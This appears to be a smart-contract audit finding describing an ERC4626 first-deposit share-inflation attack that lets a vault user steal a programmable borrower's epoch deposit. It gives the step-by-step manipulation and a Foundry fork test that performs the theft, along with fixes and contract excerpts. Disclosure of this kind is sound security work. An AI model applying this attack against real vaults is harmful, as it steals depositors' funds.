### Title
First-deposit ERC4626 share inflation lets a vault user steal programmable-borrower deposits - (File: contracts/strategies/idle/ProgrammableBorrower.sol)

### Summary
`ProgrammableBorrower` trusts the configured ERC4626 vault’s share conversion and records deposited assets as principal without requiring a minimum number of vault shares. If the configured vault is empty or has very low share supply, an unprivileged vault user can inflate its share price before the first borrower deposit, cause `_depositToVault` to mint zero or dust shares, and then redeem their own shares for both the donation and the credit-vault assets. The result is a Mango-style low-liquidity price manipulation: an external price is inflated, protocol assets are converted at the manipulated price, and the credit vault is left with bad debt or an unrecoverable vault loss. [1](#0-0) [2](#0-1) 

### Finding Description
The borrower supports any ERC4626 vault whose `asset()` matches the credit-vault underlying; initialization and `setVault` validate the asset but do not validate minimum supply, minimum returned shares, or protect deposits against share-price manipulation. [3](#0-2) [1](#0-0) 

At epoch start, `onStartEpoch` deposits the borrower’s entire on-hand balance into the vault through `_depositToVault`, snapshots `epochStartVaultAssets` as the pre-deposit asset value, and activates epoch accounting. [4](#0-3) 

`_depositToVault` calls `vault.deposit(_assetAmount, address(this))` and accepts the returned `shares` unconditionally. [2](#0-1) 

For an empty ERC4626 implementation with floor-rounded share minting, an attacker can:

1. Deposit 1 wei to receive 1 vault share.
2. Donate `D` underlying directly to the vault, where `D` is large enough that the borrower deposit `A` mints 0 shares under `A * totalSupply / totalAssets`.
3. Let the borrower’s epoch-start deposit transfer `A` into the vault.
4. Redeem the attacker’s initial share for approximately `A + D + 1`, stealing `A + 1` net of the temporary donation.

Even if the vault mints dust rather than zero shares, an attacker who controls most existing vault shares captures most of the inflated value and leaves `ProgrammableBorrower` with an economically worthless position. [5](#0-4) 

The accounting then observes the theft as a vault loss: `_vaultNetInterest` compares the live `convertToAssets` value and withdrawn amount against `epochStartVaultAssets + epochDepositedToVault`, so a stolen deposit becomes a negative delta. [6](#0-5) 

`totalInterestDueNow` can collapse to zero even though the loss is real principal loss rather than merely missing yield. [7](#0-6) 

### Impact Explanation
The attacker can steal the full programmable-borrower deposit when the configured vault starts empty, or a proportional amount when they control most of a low-liquidity vault’s shares. [8](#0-7) 

The credit vault then has strategy-token backing that cannot be redeemed from the ERC4626 sleeve. A stop attempting to pull pending withdrawals or close the pool will fail or leave an underfunded position, causing `_handleBorrowerDefault` and permanent LP impairment unless external recovery is later supplied. [9](#0-8) [10](#0-9) 

Example loss: with `A = 1,000,000 USDC`, an attacker deposits 1 wei, donates slightly over `2,000,000 USDC`, causes the borrower deposit to mint 0 shares, and redeems approximately `3,000,001 USDC`, netting approximately `1,000,001 USDC` before flash-loan and gas costs.

### Likelihood Explanation
The issue requires a programmable-borrower deployment whose configured ERC4626 vault is empty, newly deployed, reset, or dominated by attacker shares at the first borrower deposit. `setVault` deliberately permits a vault switch once the borrower has no vault balance, but it checks only the asset address and does not require an existing safe share supply or slippage protection. [11](#0-10) 

No privileged role is required to manipulate the ERC4626 share price: any vault depositor can make the initial deposit and direct-donate assets. The attack is therefore conditional on vault liquidity rather than access control, matching the Mango prerequisite that the manipulated market have low liquidity. [5](#0-4) 

Existing guards do not prevent this. `_skimDonatedAssets` removes raw CDO underlying only inside the CDO and does not affect donations to the external ERC4626 vault. [12](#0-11)  `_depositToVault` has no `minShares` check, and `_currentVaultAssets` trusts `vault.convertToAssets` after the manipulated deposit. [2](#0-1) [13](#0-12) 

### Recommendation
Add deposit slippage protection to `_depositToVault`, such as accepting a `minShares` parameter or comparing the minted shares against `previewDeposit`/`convertToShares` with a bounded tolerance. [2](#0-1) 

Require the configured ERC4626 vault to have a minimum live share supply and minimum asset liquidity before enabling it, or initialize it with an owner-controlled seed deposit before routing borrower funds. [1](#0-0) 

For robust protection, calculate vault principal by shares received and post-deposit `convertToAssets`, rather than treating every deposited asset as baseline principal regardless of received shares. [4](#0-3) 

### Proof of Concept
A reproducible Foundry fork test should fork a block where the configured ERC4626 vault has no or negligible share supply before the first programmable-borrower deposit. The attacker is an ordinary vault depositor; owner, manager, and borrower remain honest.

```solidity
// test/foundry/ProgrammableBorrowerShareInflation.t.sol
function testFirstDepositInflationStealsEpochDeposit() public {
    // Fork a deployment before the first programmable-borrower vault deposit.
    vm.createSelectFork(vm.envString("MAINNET_RPC"), FORK_BLOCK);

    uint256 poolDeposit = 1_000_000e6;
    deal(address(underlying), address(cdo), poolDeposit);
    deal(address(underlying), attacker, 2_000_001e6);

    // Configure an empty/negligible-supply ERC4626 that uses floor-rounded
    // asset -> share conversion. Its asset must equal `underlying`.
    vm.prank(owner);
    programmableBorrower.setVault(address(emptyErc4626));

    // Attacker seeds one share and inflates totalAssets enough that the
    // subsequent poolDeposit mints zero shares.
    vm.startPrank(attacker);
    underlying.approve(address(emptyErc4626), type(uint256).max);
    uint256 attackerShares = emptyErc4626.deposit(1, attacker);
    underlying.transfer(address(emptyErc4626), 2_000_000e6);
    vm.stopPrank();

    // Honest LP deposits and honest manager starts the epoch.
    vm.prank(lender);
    cdo.depositAA(poolDeposit);
    vm.prank(manager);
    cdo.startEpoch();

    assertEq(
        emptyErc4626.balanceOf(address(programmableBorrower)),
        0,
        "borrower received zero vault shares"
    );

    // Attacker redeems its original share for its donation plus the pool deposit.
    uint256 before = underlying.balanceOf(attacker);
    vm.prank(attacker);
    emptyErc4626.redeem(attackerShares, attacker, attacker);
    uint256 profit = underlying.balanceOf(attacker) - before;

    assertApproxEqAbs(profit, poolDeposit, 2, "pool deposit was not stolen");
    assertGt(programmableBorrower.vaultLoss(), 0, "loss not visible");
}
```

The invariant violated is fair conversion and solvency: `epochStartVaultAssets` credits the borrower with `A` deposited assets even though `vault.deposit` returned zero claims to those assets. [14](#0-13) [2](#0-1)

  function onStartEpoch(uint256 _pendingWithdraws) external nonReentrant {
    _checkOnlyIdleCDO();
    _accrueBorrowerInterest();
    // Reserve the amount IdleCDO expects to pull back at stopEpoch before the real borrower can draw again.
    epochPendingWithdraws = _pendingWithdraws;
    uint256 currentVaultAssets = _currentVaultAssets();
    uint256 bufferStartAssets = bufferStartVaultAssets;
    // Carry vault PnL generated while the pool was in the buffer into the new active epoch so it
    // is eventually realized in tranche prices at the next stopEpoch.
    bufferedVaultDelta = int256(currentVaultAssets) - int256(bufferStartAssets);
    bufferStartVaultAssets = 0;
    // Snapshot total assets before re-depositing idle cash so the epoch principal baseline uses the
    // exact pre-deposit amount instead of a post-deposit share-conversion round-down.
    uint256 startAssets = underlyingToken.balanceOf(address(this)) + currentVaultAssets;
    // Any idle balance left on the contract between epochs is parked immediately into the vault.
    _depositToVault(underlyingToken.balanceOf(address(this)), 0);
    // Reset the epoch accounting baseline from the exact pre-start total assets so the new epoch
    // does not treat the just-deposited idle balance as fresh vault profit or loss.
    epochStartVaultAssets = startAssets;
    epochDepositedToVault = 0;
    epochWithdrawnFromVault = 0;
    epochAccountingActive = true;
    emit EpochAccountingStarted(startAssets);

  /// @dev This is the single value read by IdleCDO to price the epoch: borrower contractual
  /// interest plus paid buffer interest plus positive vault PnL minus vault losses. It is a
  /// pool-facing value, so it can be lower than `borrowerInterestDebt` when the borrower still
  /// owes full contractual interest but the vault sleeve suffered a loss.
  function totalInterestDueNow() external view returns (uint256) {
    (uint256 vaultInterest, uint256 loss) = _vaultNetInterest();
    uint256 totalGain = vaultInterest + borrowerInterestAccruedNow() + bufferInterest;

  function _vaultNetInterest() internal view returns (uint256 interest, uint256 loss) {
    if (!epochAccountingActive) return (0, 0);
    uint256 earnedAssets = _currentVaultAssets() + epochWithdrawnFromVault;
    uint256 principalAssets = epochStartVaultAssets + epochDepositedToVault;
    int256 netDelta = bufferedVaultDelta + int256(earnedAssets) - int256(principalAssets);
    if (netDelta > 0) {
      interest = uint256(netDelta);
    } else {
      loss = uint256(-netDelta);
    }

  function _depositToVault(uint256 _assetAmount, uint256 _principalAssets) internal {
